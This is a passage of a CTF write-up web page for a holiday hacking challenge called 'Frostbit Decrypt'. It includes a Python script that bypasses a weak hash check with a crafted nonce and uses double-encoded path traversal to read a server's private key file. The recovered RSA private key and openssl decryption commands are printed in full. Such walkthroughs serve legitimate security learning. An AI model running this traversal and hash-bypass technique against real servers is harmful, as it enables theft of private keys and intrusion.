</span></span><span style="display:flex;"><span>            xrd <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>filename_bytes[count_filename_mod] <span style="color:#f92672">^</span> self<span style="color:#f92672">.</span>nonce_bytes[count_nonce_mod]
</span></span><span style="display:flex;"><span>            hash_result[count_mod] <span style="color:#f92672">=</span> hash_result[count_mod] <span style="color:#f92672">&amp;</span> xrd
</span></span><span style="display:flex;"><span>            count <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> bytes(hash_result)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">digest</span>(self) <span style="color:#f92672">-&gt;</span> bytes:
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;Returns the raw binary hash result.&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>hash_result
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hexdigest</span>(self) <span style="color:#f92672">-&gt;</span> str:
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;Returns the hash result as a hexadecimal string.&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> binascii<span style="color:#f92672">.</span>hexlify(self<span style="color:#f92672">.</span>hash_result)<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">update</span>(self, file_bytes: bytes <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>, filename_bytes: bytes <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>, nonce_bytes: bytes <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;Updates the internal state with new bytes and recomputes the hash.&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> file_bytes <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>file_bytes <span style="color:#f92672">=</span> file_bytes
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> filename_bytes <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>filename_bytes <span style="color:#f92672">=</span> filename_bytes
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> nonce_bytes <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>nonce_bytes <span style="color:#f92672">=</span> nonce_bytes
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>hash_result <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_compute_hash()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">validate</span>(self, hex_string: str):
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;Validates if the provided hex string matches the computed hash.&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            decoded_bytes <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>unhexlify(hex_string)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> decoded_bytes <span style="color:#f92672">==</span> self<span style="color:#f92672">.</span>digest():
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>, <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>            stack_trace <span style="color:#f92672">=</span> traceback<span style="color:#f92672">.</span>format_exc()
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>stack_trace<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>, <span style="color:#66d9ef">None</span></span></span></code></pre></div>
<h3 id="from-other-objectives">From other objectives</h3>
<p>The Santa Vision objective had some references to Frostbit in the feeds:</p>
<p><a href="#R-image-20ca78e2593fbc12523cf4fb36ea2306" class="lightbox-link"><img alt="Feed message 1" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-3.png" style=" height: auto; width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-20ca78e2593fbc12523cf4fb36ea2306"><img alt="Feed message 1" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-3.png"></a></p>
<p><a href="#R-image-c5295ee69df6be0e392778aa94214724" class="lightbox-link"><img alt="Feed message 2" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-4.png" style=" height: auto; width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-c5295ee69df6be0e392778aa94214724"><img alt="Feed message 2" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-4.png"></a></p>
<p>Appears this path might be important: <code>/etc/nginx/certs/api.frostbit.app.key</code></p>
<h2 id="solution">Solution</h2>
<h3 id="gold">Gold</h3>
<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nonce <span style="color:#f92672">=</span> bytes([
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xe9</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x98</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xa5</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x0d</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x97</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x9e</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xe2</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xd7</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xe9</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x98</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xa5</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x0d</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x97</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x9e</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xe2</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xd7</span>,
</span></span><span style="display:flex;"><span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nonce_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%25&#34;</span><span style="color:#f92672">.</span>join(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>byte<span style="color:#e6db74">:</span><span style="color:#e6db74">02x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#66d9ef">for</span> byte <span style="color:#f92672">in</span> nonce)
</span></span><span style="display:flex;"><span>separator <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(<span style="color:#e6db74">&#34;/&#34;</span>))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;%25</span><span style="color:#e6db74">{</span>nonce_string<span style="color:#e6db74">}{</span>separator<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://api.frostbit.app/view/</span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?debug=1&amp;digest=00000000000000000000000000000000&#34;</span>
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(url)
</span></span><span style="display:flex;"><span>print(res<span style="color:#f92672">.</span>text)</span></span></code></pre></div>
<p>Which gave an URL <code>https://api.frostbit.app/view/%25e9%2598%25a5%250d%2597%259e%25e2%25d7%25e9%2598%25a5%250d%2597%259e%25e2%25d7%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?debug=1&amp;digest=00000000000000000000000000000000</code> that upon visiting showed me:</p>
<p><a href="#R-image-f30a98c22069859e85960ef6b0a10cf4" class="lightbox-link"><img alt="Feed message 6" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-6.png" style=" height: auto; width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-f30a98c22069859e85960ef6b0a10cf4"><img alt="Feed message 6" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-6.png"></a></p>
<p>The RSA PRIVATE KEY is:</p>
<div class="highlight wrap-code"><pre tabindex="0"><code>-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----</code></pre></div>
<p>I quickly tested decrypted the encrypted CSV file, but it wasn&rsquo;t doable. However, I found something interesting earlier on in one of the JSON replies. Namely an encrypted key:</p>
<div class="highlight wrap-code"><pre tabindex="0"><code>{&#34;encryptedkey&#34;:&#34;2ea5d786947ab4dbc462dc0d1fe878b07f46df032f17b43aeeedea7a2683996377d3b57cc2f94781deef9f81e966309e09e26577d5110836c4236b8dc3bec734ed0060168b30530b99d66cb4d33d9e87712dd71fb8ab6d311430b55743994400e9eb452a378a6c930225f69f46bdef91581a6325b4e873458d4fc9287a2f4af7bbc68a6f3db16b1e463982a815b2fc291b1013e880a2a8f077c1fed52a7673ec1bfc7a4bb6edba03ab670332fa3627f20116f6ceeed97a757bb220494cd696e8f5f05869b6f57f5aef18e204c7213d634b56fae8751b7521d86eb5f7d692313398ff70cded16d5eddef0ec655e7a5279d97a15d1c8efa8aac1c4b0073657007a96e34eeeaae9460629ae9ce5d219d512afef28736e6844f297c02e6cf992e36de5fdc8e0f79b71e92a3ecac6c1b703c84ecd7ca8deb52061441d0c30e3c8be30f3a8658be84a26bf7e7ce3d5b4637da157f7e87795fcfecc8411532ad0cc7c6a8a4de2861c2df429507f1909928cb735b4e3758c139b865e0b2ffceac950880219bdf644e6dca7545c03bff09194624a8fbb0ea54ee6ee3caf4749ca2165873b02e46548be0bbffea92cad7bd89606ed3f1f157d4fedc393007de842ab1e17e23f6fb4b4b963f328f1b55bf2fbe1ad57109a4a835308d6dfa0aaf98069bf44f0c8d50fe302205a82c181587d7fab4c1bf562109593a601f7b026e4236f71fc8f&#34;,&#34;nonce&#34;:&#34;e998a50d979ee2d7&#34;}</code></pre></div>
<p>Whipping up a simple decoder script:</p>
<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#34;2ea5d786947ab4dbc462dc0d1fe878b07f46df032f17b43aeeedea7a2683996377d3b57cc2f94781deef9f81e966309e09e26577d5110836c4236b8dc3bec734ed0060168b30530b99d66cb4d33d9e87712dd71fb8ab6d311430b55743994400e9eb452a378a6c930225f69f46bdef91581a6325b4e873458d4fc9287a2f4af7bbc68a6f3db16b1e463982a815b2fc291b1013e880a2a8f077c1fed52a7673ec1bfc7a4bb6edba03ab670332fa3627f20116f6ceeed97a757bb220494cd696e8f5f05869b6f57f5aef18e204c7213d634b56fae8751b7521d86eb5f7d692313398ff70cded16d5eddef0ec655e7a5279d97a15d1c8efa8aac1c4b0073657007a96e34eeeaae9460629ae9ce5d219d512afef28736e6844f297c02e6cf992e36de5fdc8e0f79b71e92a3ecac6c1b703c84ecd7ca8deb52061441d0c30e3c8be30f3a8658be84a26bf7e7ce3d5b4637da157f7e87795fcfecc8411532ad0cc7c6a8a4de2861c2df429507f1909928cb735b4e3758c139b865e0b2ffceac950880219bdf644e6dca7545c03bff09194624a8fbb0ea54ee6ee3caf4749ca2165873b02e46548be0bbffea92cad7bd89606ed3f1f157d4fedc393007de842ab1e17e23f6fb4b4b963f328f1b55bf2fbe1ad57109a4a835308d6dfa0aaf98069bf44f0c8d50fe302205a82c181587d7fab4c1bf562109593a601f7b026e4236f71fc8f&#34;</span> | xxd -r -p &gt; encrypted_data.bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>openssl pkeyutl -decrypt -inkey key.pem -in encrypted_data.bin -out decrypted_data_1</span></span></code></pre></div>
<p>With this script I got the following output:</p>
<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>52685b92ec2ae608c3fe1eedc3789953,e998a50d979ee2d7</span></span></code></pre></div>
<p>Appears to be a Symmetric Key and IV Pair. Heading over to Cyberchef to solve it, as it appear to be AES based:</p>
<p><a href="#R-image-6040b601fa99b31ad29ee8e86bef5f19" class="lightbox-link"><img alt="Cyberched decode" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-7.png" style=" height: auto; width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-6040b601fa99b31ad29ee8e86bef5f19"><img alt="Cyberched decode" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-7.png"></a></p>
<p>Answer: Xena Xtreme</p>

  <footer class="footline">
  </footer>
</article>
        </div>
      </main>
    </div>
    <aside id="R-sidebar" class="default-animation">
      <div id="R-header-topbar" class="default-animation"></div>
      <div id="R-header-wrapper" class="default-animation">
        <div id="R-header" class="default-animation">
<img src="/images/logo.png" />

        </div>
        <script>
          window.index_js_url="/searchindex.en.js?1734945675";
        </script>
        <search><form action="/search/index.html" method="get">
          <div class="searchbox default-animation">
            <button class="search-detail" type="submit" title="Search (CTRL+ALT+f)"><i class="fas fa-search"></i></button>
            <label class="a11y-only" for="R-search-by">Search</label>
            <input data-search-input id="R-search-by" name="search-by" class="search-by" type="search" placeholder="Search...">
            <button class="search-clear" type="button" data-search-clear="" title="Clear search"><i class="fas fa-times" title="Clear search"></i></button>
          </div>
        </form></search>
        <script>
          var contentLangs=['en'];
        </script>
        <script src="/js/auto-complete.js?1734945675" defer></script>
        <script src="/js/lunr/lunr.min.js?1734945675" defer></script>
        <script src="/js/lunr/lunr.stemmer.support.min.js?1734945675" defer></script>
        <script src="/js/lunr/lunr.multi.min.js?1734945675" defer></script>
        <script src="/js/lunr/lunr.en.min.js?1734945675" defer></script>
        <script src="/js/search.js?1734945675" defer></script>
      </div>
      <div id="R-homelinks" class="default-animation">
        <hr class="padding">
      </div>
      <div id="R-content-wrapper" class="highlightable">
        <div id="R-shortcutmenu-home" class="R-sidebarmenu">
          <ul class="enlarge morespace collapsible-menu">
            <li class="" data-nav-id="/prologue/index.html"><a class="padding" href="/prologue/index.html">Prologue</a><ul id="R-subsections-79f8c3758567434c5ed9379b17ae831b" class="collapsible-menu"></ul></li>
            <li class="" data-nav-id="/act1/index.html"><a class="padding" href="/act1/index.html">Act1</a><ul id="R-subsections-8dc0c36ceefa45529ff4cf1f9bdc1f66" class="collapsible-menu"></ul></li>
            <li class="" data-nav-id="/act2/index.html"><a class="padding" href="/act2/index.html">Act2</a><ul id="R-subsections-9d3d8c898368693a495088de36411fa6" class="collapsible-menu"></ul></li>
            <li class="parent " data-nav-id="/act3/index.html"><a class="padding" href="/act3/index.html">Act3</a><ul id="R-subsections-0b6215c9fad834351813cc2ad0d4a335" class="collapsible-menu">
            <li class="" data-nav-id="/act3/elf-stack/index.html"><a class="padding" href="/act3/elf-stack/index.html">Elf Stack</a></li>
            <li class="" data-nav-id="/act3/santa-vision/index.html"><a class="padding" href="/act3/santa-vision/index.html">Santa Vision</a></li>
            <li class="active " data-nav-id="/act3/elf-frostbit-decrypt/index.html"><a class="padding" href="/act3/elf-frostbit-decrypt/index.html">Elf Frostbit Decrypt</a></li>
            <li class="" data-nav-id="/act3/elf-frostbit-deactivate/index.html"><a class="padding" href="/act3/elf-frostbit-deactivate/index.html">Elf Frostbit Deactivate</a></li></ul></li>
            <li class="" data-nav-id="/about/index.html"><a class="padding" href="/about/index.html">About</a></li>
          </ul>
        </div>
    
        <div class="padding footermargin footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showFooter"></div>
        <div id="R-menu-footer">
          <hr class="padding default-animation footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showFooter">
          <div id="R-prefooter" class="footerLangSwitch footerVariantSwitch footerVisitedLinks">
            <ul>
              <li id="R-select-language-container" class="footerLangSwitch">
                <div class="padding menu-control">
                  <i class="fa-fw fas fa-language"></i>
                  <span>&nbsp;</span>
                  <div class="control-style">
                    <label class="a11y-only" for="R-select-language">Language</label>
                    <select id="R-select-language" onchange="location = this.querySelector( this.value ).dataset.url;">
                      <option id="R-select-language-en" value="#R-select-language-en" data-url="/act3/elf-frostbit-decrypt/index.html" lang="en-us" selected></option>
                    </select>
                  </div>
                  <div class="clear"></div>
                </div>
              </li>
              <li id="R-select-variant-container" class="footerVariantSwitch">
                <div class="padding menu-control">
                  <i class="fa-fw fas fa-paint-brush"></i>
                  <span>&nbsp;</span>
                  <div class="control-style">
                    <label class="a11y-only" for="R-select-variant">Theme</label>
                    <select id="R-select-variant" onchange="window.variants && variants.changeVariant( this.value );">
                      <option id="R-select-variant-christmas" value="christmas" selected>Christmas</option>
                    </select>
                  </div>
                  <div class="clear"></div>
                </div>
                <script>window.variants && variants.markSelectedVariant();</script>
              </li>
              <li class="footerVisitedLinks">
                <div class="padding menu-control">
                  <i class="fa-fw fas fa-history"></i>
                  <span>&nbsp;</span>
                  <div class="control-style">
                    <button onclick="clearHistory();">Clear History</button>
                  </div>
                  <div class="clear"></div>
                </div>
              </li>
            </ul>
          </div>
          <div id="R-footer" class="footerFooter showFooter">
        <p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p>
          </div>
        </div>
      </div>
    </aside>
    <script src="/js/clipboard.min.js?1734945675" defer></script>
    <script src="/js/perfect-scrollbar.min.js?1734945675" defer></script>
    <script src="/js/d3/d3-color.min.js?1734945675" defer></script>
    <script src="/js/d3/d3-dispatch.min.js?1734945675" defer></script>
    <script src="/js/d3/d3-drag.min.js?1734945675" defer></script>
    <script src="/js/d3/d3-ease.min.js?1734945675" defer></script>
    <script src="/js/d3/d3-interpolate.min.js?1734945675" defer></script>
    <script src="/js/d3/d3-selection.min.js?1734945675" defer></script>
    <script src="/js/d3/d3-timer.min.js?1734945675" defer></script>
    <script src="/js/d3/d3-transition.min.js?1734945675" defer></script>
    <script src="/js/d3/d3-zoom.min.js?1734945675" defer></script>
    <script src="/js/js-yaml.min.js?1734945675" defer></script>
    <script src="/js/mermaid.min.js?1734945675" defer></script>
    <script>
      window.themeUseMermaid = JSON.parse("{}");
    </script>
    <script src="/js/theme.js?1734945675" defer></script>
  </body>
</html>
